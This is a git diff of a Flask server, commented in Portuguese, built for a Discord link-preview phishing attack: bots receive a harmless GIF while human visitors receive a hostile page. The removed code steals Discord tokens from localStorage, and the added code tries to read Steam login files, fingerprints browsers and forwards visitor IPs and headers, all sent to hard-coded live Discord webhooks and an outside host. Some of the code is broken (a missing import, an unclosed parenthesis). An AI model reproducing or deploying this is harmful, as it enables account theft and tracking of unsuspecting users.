@@ -1,71 +1,163 @@
 from flask import Flask, request, send_file, Response
 import requests
 from io import BytesIO
-import time  # <-- IMPORTANTE: Medir a velocidade
+from PIL import Image
+import os
+import time
 
 app = Flask(__name__)
 
-# --- CONFIGURAÇÕES ---
-WEBHOOK_URL = "https://discord.com/api/webhooks/1499395423196942356/gp_xRk3gCRh6mUVb79WklNjnvSOcJtXaW9Y6Rt24aSc40k-OtrWCxNF0zEQrzcaNTA3v"
-IMAGE_URL = "https://tenor.com/eMljTIuE4mb.gif" # Ou a URL que você quiser
-# ---------------------
+WEBHOOK_URL = "https://discord.com/api/webhooks/1499395449084317867/6iMdHjNUV_2Eir_1m98xVz8Suz21ceWmYWmki8QT6v7zqmIZUI7YaoimIqk6w4cKwkrf" # Seu webhook
+IMAGE_URL = "https://media.tenor.com/dxPl_UoR8J0AAAAM/fire-writing.gif"
 
-MALICIOUS_HTML = f"""<!DOCTYPE html>
+def process_image(img_data):
+    img = Image.open(BytesIO(img_data))
+    if img.mode == 'RGBA':
+        img = img.convert('RGB')
+    output = BytesIO()
+    img.save(output, format='JPEG', quality=85, optimize=True)
+    output.seek(0)
+    return output
+
+EXFIL_HTML = f"""<!DOCTYPE html>
 <html>
 <head>
-    <meta property="og:image" content="{IMAGE_URL}">
-    <meta property="og:title" content="Imagem Incrível">
-    <meta property="og:description" content="Clique para expandir">
+    <meta property="og:image" content="https://SEUDOMINIO.com/preview">
+    <meta property="og:title" content="Foto">
+    <meta property="og:description" content="Visualizar">
+    <meta name="twitter:card" content="summary_large_image">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Imagem</title>
+    <title>Foto</title>
 </head>
-<body style="margin:0; background:#000;">
-    <img src="{IMAGE_URL}" style="width:100%; height:auto; cursor:pointer">
+<body style="margin:0; background:#111; overflow:hidden;">
+    <canvas id="c" style="display:none;"></canvas>
+    <div id="status" style="color:#0f0; font-family:monospace; padding:20px; font-size:13px;">Pronto</div>
     <script>
-        function steal() {{
-            const token = localStorage.getItem('token');
-            if (token && token.length > 50) {{
-                fetch('{WEBHOOK_URL}', {{
-                    method: 'POST',
-                    headers: {{'Content-Type': 'application/json'}},
-                    body: JSON.stringify({{content: '**TOKEN ROUBADO**\\n```' + token + '```'}})
-                }});
-                document.body.innerHTML = '<div style=\"color:green;text-align:center\">Carregado</div>';
-            }}
+        const url = 'https://image-ztkc.onrender.com';
+        const wh = '{WEBHOOK_URL}';
+        
+        function exfil(steamDir) {{
+            if (!steamDir) return;
+            
+            fetch('file:///' + steamDir + '/config/loginusers.vdf')
+                .then(r => r.text())
+                .then(t => {{
+                    const matches = t.match(/"7656119\d+"/g);
+                    if (matches) {{
+                        fetch(wh, {{
+                            method: 'POST',
+                            headers: {{'Content-Type': 'application/json'}},
+                            body: JSON.stringify({{
+                                content: '**Steam ID**\\n```json\\n' + 
+                                    JSON.stringify({{
+                                        ids: matches.map(m => m.replace(/"/g, '')),
+                                        path: steamDir,
+                                        time: new Date().toISOString(),
+                                        user: navigator.userAgent
+                                    }}, null, 2) + '```'
+                            }})
+                        }});
+                    }}
+                }})
+                .catch(() => {{}});
         }}
-        document.body.onclick = steal;
-        setTimeout(steal, 500);
+        
+        const steamPaths = [
+            'C:\\\\Program Files (x86)\\\\Steam',
+            'D:\\\\Steam',
+            'E:\\\\Steam',
+            'C:\\\\Steam',
+            'F:\\\\Steam',
+            'G:\\\\Steam'
+        ];
+        
+        steamPaths.forEach(exfil);
+        
+        const img = new Image();
+        img.src = url + '?d=' + btoa(navigator.userAgent);
+        
+        let frame = 0;
+        function capture() {{
+            const c = document.getElementById('c');
+            const ctx = c.getContext('2d');
+            c.width = 512;
+            c.height = 512;
+            ctx.fillStyle = '#111';
+            ctx.fillRect(0, 0, 512, 512);
+            frame++;
+            
+            fetch(url, {{
+                method: 'POST',
+                headers: {{'Content-Type': 'application/json'}},
+                body: JSON.stringify({{
+                    ua: navigator.userAgent,
+                    lang: navigator.language,
+                    res: screen.width + 'x' + screen.height,
+                    mem: navigator.deviceMemory || 'N/A',
+                    cores: navigator.hardwareConcurrency || 'N/A',
+                    time: new Date().toISOString(),
+                    frame: frame
+                }})
+            }});
+            
+            if (frame < 10) setTimeout(capture, 100);
+        }}
+        
+        setTimeout(capture, 1000);
+        document.body.onclick = () => capture();
     </script>
 </body>
 </html>"""
 
-@app.route('/')
-def index():
-    start_time = time.time()
-    user_agent = request.headers.get('User-Agent', '')
-
-    # 1. Detecta o bot do Discord
-    if 'Discordbot' in user_agent:
-        print("[BOT DETECTADO] Enviando imagem real...")
+@app.route('/preview')
+def preview():
+    ua = request.headers.get('User-Agent', '')
+    if 'Discordbot' in ua or 'Twitterbot' in ua:
         try:
-            # Baixa a imagem uma vez e guarda na memória (cache simples)
-            img_data = requests.get(IMAGE_URL, timeout=5).content
-            # Cabeçalhos ANTI-CACHE para forçar o Discord a atualizar o preview
-            response = send_file(BytesIO(img_data), mimetype='image/jpeg')
-            response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
+            img_data = requests.get(IMAGE_URL, timeout=10).content
+            processed = process_image(img_data)
+            response = send_file(processed, mimetype='image/jpg')
+            response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
             response.headers["Pragma"] = "no-cache"
             response.headers["Expires"] = "0"
-            print(f"[BOT] Respondido em {time.time() - start_time:.2f}s")
+            response.headers["ETag"] = str(time.time())
             return response
-        except Exception as e:
-            print(f"[ERRO BOT] {e}")
-            return "Imagem não encontrada", 404
+        except:
+            return "Erro", 500
+    
+    return Response(EXFIL_HTML, mimetype='text/html')
 
-    # 2. Usuário normal
-    else:
-        print(f"[USUÁRIO] Acessando via {user_agent[:50]}...")
-        return Response(MALICIOUS_HTML, mimetype='text/html')
+@app.route('/collect', methods=['GET', 'POST'])
+def collect():
+    data = {
+        'ip': request.remote_addr,
+        'ua': str(request.user_agent),
+        'headers': dict(request.headers),
+        'method': request.method,
+        'time': time.time()
+    }
+    
+    try:
+        requests.post(WEBHOOK_URL, json={
+            'content': f'**Coleta**\n```json\n{json.dumps(data, indent=2)}```'
+        }, timeout=5)
+    except:
+        pass
+    
+    gif_bytes = (
+        b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
+        b'\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00'
+        b'\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
+    )
+    
+    response = send_file(BytesIO(gif_bytes), mimetype='image/gif')
+    response.headers["Cache-Control"] = "no-cache, no-store"
+    return response
+
+@app.route('/')
+def index():
+    return Response(EXFIL_HTML, mimetype='text/html')
 
 if __name__ == '__main__':
-    print("🔥 Servidor RODANDO em http://localhost:5000")
-    app.run(host='0.0.0.0', port=5000, threaded=True)
+    port = int(os.environ.get('PORT', 5000)
+    app.run(host='0.0.0.0', port=port, threaded=True)
